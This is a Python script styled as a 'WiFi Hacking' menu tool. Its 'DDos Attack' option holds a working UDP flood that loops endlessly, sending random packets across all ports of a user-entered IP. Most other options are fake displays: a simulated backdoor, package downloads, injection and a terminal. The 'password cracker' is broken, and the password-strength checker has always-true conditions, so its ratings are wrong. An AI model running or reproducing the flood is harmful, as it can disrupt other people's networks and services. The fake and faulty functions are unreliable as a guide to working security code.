#Import libraries
import sys
import os
import time
import socket
import random
import subprocess
import platform
import requests

#Import current time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
wifipassword = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#Package List
characters = (
'a','b','c','d','e','f','g','h','i','j','k','l','m',
'n','o','p','q','r','s','t','u','v','w','x','y','z',
'A','B','C','D','E','F','G','H','I','J','K','L','M',
'N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
,'0','1','2','3','4','5','6','7','8','9','0','!','?','@','#','$','%')

#Loading animation
def loadinganimation(): 
	number = 0
	for i in range(10):
		print(number, "%")
		number += 10
		time.sleep(0.1)
		os.system("clear")

#Loading
loadinganimation()
print("Downloading packeges...")
for i in range(100000):
	packagelist = random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters)
	print("Downloading: ", packagelist, "...")
os.system("clear")

#All defenitions
#All commands
def showcommands():
	print("Commands:")

#Start DDos Attack
def startloop():
	sent = 0
	current_port = port
	while True:
		sock.sendto(bytes, (ip, current_port))
		sent += 1
		current_port += 1
		print(f"Sent {sent} packets to {ip} through port: {current_port}")
		if current_port == 65534 or current_port > 65534:
			current_port = 1

#Get IP by http or https		
def get_hostname_IP():
    	print("Sheriff v20")
    	print("Made by CLOUD_STUDIOS")
    	hostname = input("Please enter website address (URL): ")
    	try:
    	   print("--------------------------------------")
    	   print (f'Hostname: {hostname}')
    	   print (f'IP: {socket.gethostbyname(hostname)}')
    	except socket.gaierror as error:
    		print (f'Invalid Hostname, error raised is {error}')

#Get hostname server info
def get_server_info():
    hostname = socket.gethostname()
    
    ip_address = socket.gethostbyname(hostname)
    
    os_name = platform.system()
    os_version = platform.version()
    os_release = platform.release()
    
    cpu_count = os.cpu_count()
    processor = platform.processor()
    
    server_info = {
        "Hostname": hostname,
        "IP Address": ip_address,
        "Operating System": f"{os_name} {os_release} (Version: {os_version})",
        "CPU": f"{processor} ({cpu_count} cores)"
    }
    
    return server_info

#Get location from IP Address    
def get_location(ip_address=""):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            data = response.json()
            location = {
                "IP": data.get("ip"),
                "City": data.get("city"),
                "Region": data.get("region"),
                "Country": data.get("country"),
                "Coordinates": data.get("loc"),
                "ISP": data.get("org")
            }
            return location
        else:
            return {"Error": f"Failed to fetch data. Status code: {response.status_code}"}
    except Exception as e:
        return {"Error": str(e)}

os.system("cls")
print("""
        
██╗    ██╗██╗███████╗██╗   ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     
██║    ██║██║██╔════╝██║   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     
██║ █╗ ██║██║█████╗  ██║   ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗    
██║███╗██║██║██╔══╝  ██║   ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║    
╚███╔███╔╝██║██║     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝    
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
                                 v:0.0.2


      .;'                     `;,     Author : creator_jakai
     .;'  ,;'             `;,  `;,   
    .;'  ,;'  ,;'     `;,  `;,  `;, 
    ::   ::   :   ( )   :   ::   ::
    ':.  ':.  ':. /_\\ ,:'  ,:'  ,:'
     ':.  ':.    /___\\    ,:'  ,:'
      ':.       /_____\\      ,:'       Compatible with: Linux, Android & ChromeOS                               
               /       \\               Tools : WiFi/Hacking & Networking                                                              
    -------------------------------------------------------------------------  

            Menu:
            1) DDos Attack
            2) FLY Injection
            3) Wifi Terminal (Run admin level commands on network)
            4) Run Linux Ubuntu
            5) HTTP/HTTPS IP Finder (Sheriff)
            6) Wifi Password
            7) Test Password
            8) Create Backdoor
            
            i) Info
            c) Credits
            0) Exit
    -------------------------------------------------------------------------  
""")

answer = input("Choice: ")
if answer == "1":
	os.system("clear")
	print(""" ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⣀⡀⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⣏⣭⣻⣛⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠘⠀⠈⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⠀⢀⣀⣶⣦⣶⣦⣄⡀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣷⣄⣀⣴⣿⣿⣭⣭⣭⣿⣽⣿⣷⣀⣀⣾⡿⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠘⢿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⠿⡋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⣀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
	print("DDos Attack")
	print("-"*25)
	ip = input("IP Target : ")
	port = int(input("Port : "))
	#Start Loading Animation
	loadinganimation()
	os.system("cls" if os.name == "nt" else "clear")
	#Start DDos Attack	
	startloop()

elif answer == "2":
	os.system("clear")
	print("FLY Injection")
	print("-"*25)
	input("IP Target: ")
	loadinganimation()

elif answer == "3":
	loadinganimation()
	time.sleep(1)
	print("Wifi Terminal v1.00.5iuq")
	print("Made by creator_jakai")
	print("Typ ¨help¨ to show all commands")
	print("Copyright 2024-2026 - All rights reserved")
	print("-"*25)
	while True:
		terminalinput = input(">"*3)
		if terminalinput == "help":
			showcommands()
		elif terminalinput == "/shutdown":
			print("Shutting down device...")
			print("Error: Could not find device")
		else:
			print("Invalid command :(")
			
elif answer == "4":
	loadinganimation()
	print("Downloading packeges...")
	for i in range(100):
		packagelist = random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), 	random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.				choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters), random.choice(characters)
		print("Downloading: ", packagelist, "...")
		time.sleep(0.1)
	os.system("clear")
	print("""⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠁⠀⠀⠀⠀⠈⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿
⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣦⠀⠀⠀⠈⢻⣿⣿⣿
⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣶⣾⣷⣶⣆⠸⣿⣿⡟⠀⠀⠀⠀⠀⠹⣿⣿
⣿⠃⠀⠀⠀⠀⠀⠀⣠⣾⣷⡈⠻⠿⠟⠻⠿⢿⣷⣤⣤⣄⠀⠀⠀⠀⠀⠀⠘⣿
⡏⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⢹
⠁⠀⠀⢀⣤⣤⡘⢿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡇⠀⠀⠀⠀⠀⠈
⠀⠀⠀⣿⣿⣿⡇⢸⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣉⣉⡁⠀⠀⠀⠀⠀⠀
⡀⠀⠀⠈⠛⠛⢡⣾⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⢀
⣇⠀⠀⠀⠀⠀⠀⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠟⠀⠀⠀⠀⠀⠀⣸
⣿⡄⠀⠀⠀⠀⠀⠀⠙⢿⡿⢁⣴⣶⣦⣴⣶⣾⡿⠛⠛⠋⠀⠀⠀⠀⠀⠀⢠⣿
⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⢿⡿⠿⠏⢰⣿⣿⣧⠀⠀⠀⠀⠀⣰⣿⣿
⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⠟⠀⠀⠀⢀⣼⣿⣿⣿
⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⡀⠀⠀⠀⠀⢀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿""")
	print("Ubuntu 24.04.4 LTS")
	print("-"*25)

elif answer == "5":
	get_hostname_IP()
	print()
	print("------------Your Device Info--------------")
	if __name__ == "__main__":
	   info = get_server_info()
	   for key, value in info.items():
	   	print(f"{key}: {value}")
	if __name__ == "__main__":
	   print()
	   print("-------------Server Location--------------")
	   ip = input("IP Adress: ")
	   location_info = get_location(ip)
	   for key, value in location_info.items():
	   	print(f"{key}: {value}")

elif answer == "6":
	passwordlength = 0
	trying = 0
	loop = True
	os.system("clear")
	print("Password Cracker")
	print("-"*25)
	network = input("Network name: ")
	while passwordloop:
	   for i in range(10000):
	   	guessedpassword = ''.join(random.choice(characters) for _ in range(passwordlength))
	   	print("Trying... ", guessedpassword)
	   	print("Times: ", trying)
	   	trying += 1
	   	
	   	if guessedpassword == wifipassword:
	   	   os.system("clear")
	   	   print("Password: ", guessedpassword)
	   	   print("Guessed: ", trying, " times")
	   	   loop = False
	   	   while True:
	   	   	break
	   if passwordlength == 50:
	   	os.system("clear")
	   	loop = False
	   	print("Error: Password exceeded length limit :(")
	   	while True:
	   		break
	   passwordlength += 1

elif answer == "7":
	os.system("clear")
	securepoints = 0
	print("Password Tester")
	password = input("Password: ")
	if "!" or "?" or "@" or "#" or "$" or "%" or "ˆ" or "&" or "*" or "(" or ")" or "-" or "_" or "+" or "=" or "˜" or "ˋ" or ":" or ";" or "´" or "<" or ">" or "/" or "." or "," or "|" or "[" or "]" or "{" or "}" in password:
		securepoints += 1
	if "0" or "1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9" in password:
		securepoints += 1
	if "a" or "b" or "c" or "d" or "e" or "f" or "g" or "h" or "i" or "j" or "k" or "l" or "m" or "n" or "o" or "p" or "q" or "r" or "s" or "t" or "u" or "v" or "w" or "x" or "y" or "z" in password:
		securepoints += 1
	if "A" or "B" or "C" or "D" or "E" or "F" or "G" or "H" or "I" or "J" or "K" or "L" or "M" or "N" or "O" or "P" or "Q" or "R" or "S" or "T" or "U" or "V" or "W" or "X" or "Y" or "Z" in password:
		securepoints += 1
	if len(password) > 8:
		securepoints += 1
	if len(password) > 10:
		securepoints += 2
	if len(password) > 12:
		securepoints += 3
	if len(password) > 14:
		securepoints += 1
	if securepoints == 4:
		print("Password level= 1")
	if securepoints == 1:
		print("Password level= 2")
	if securepoints == 2:
		print("Password level= 3")
	if securepoints == 3:
		print("Password level= 4")
	if securepoints == 4:
		print("Password level= 5")
	if securepoints == 5:
		print("Password level= 6")
	if securepoints == 6:
		print("Password level= 7")
	if securepoints == 7:
		print("Password level= 8")
	if securepoints == 8:
		print("Password level= 9")
	if securepoints == 9 or securepoints > 9:
		print("Password level= 10")
		
elif answer == "8":
	os.system("clear")
	loop = True
	backdoordata = 0
	device = ("ComputerDEMO", "DigiboardDEMO") 
	print("APT Backdoor")
	print("-"*25)
	backdoorip = input("IP: ")
	input("Network name (Optional): ")
	input("Backdoor name: ")
	os.system("clear")
	while loop:
		backdoordata = ''.join(random.choice(characters) for _ in range(25))
		try:
			print("Data: ", backdoordata, "Device: ", random.choice(device))
			time.sleep(0.1)
		except IndexError:
			os.system("clear")
			print("Error: IndexError")
			loop = False
			while True:
				break
		
elif answer == "i":
	print("Wifi Tools Official")
	print("Current version: v0.0.2")
	print("Copyright 2024-2026")
	print("All rights reserved")
	print("-"*20)
	print("Optimized for: ")
	print("-Linux")
	print("-ChromeOS")
	print("-Android")

elif answer == "c":
	print("Credits: ")
	print("creator_jakai - https://github.com/creatorjakai")
	print("Ha3MrX - https://github.com/Ha3MrX")

elif answer == "0":
	while True:
		break

else:
	print("Invalid number :(")